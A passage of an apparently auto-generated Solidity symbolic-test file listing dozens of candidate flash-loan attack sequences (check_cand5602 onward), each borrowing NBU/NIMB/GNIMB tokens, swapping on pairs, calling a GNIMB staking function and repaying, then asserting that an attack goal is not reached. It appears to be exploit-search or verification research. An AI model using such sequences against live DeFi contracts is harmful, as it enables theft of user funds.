        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5602(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5603(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5604(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5605(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5606(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5607(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_gnimb(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5608(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5609(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5610(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5611(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5612(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5613(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5614(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5615(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        swap_pairnbunimb_nbu_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5616(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5617(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5618(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5619(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5620(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        swap_pairnbunimb_nbu_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5621(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5622(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5623(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5624(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5625(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        swap_pairnbunimb_nbu_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5626(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5627(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5628(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        swap_pairnbunimb_nbu_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5629(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5630(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5631(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        swap_pairnbunimb_nbu_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5632(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5633(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5634(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5635(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5636(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5637(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5638(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5639(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5640(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        swap_pairnbunimb_nbu_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5641(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5642(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5643(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5644(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
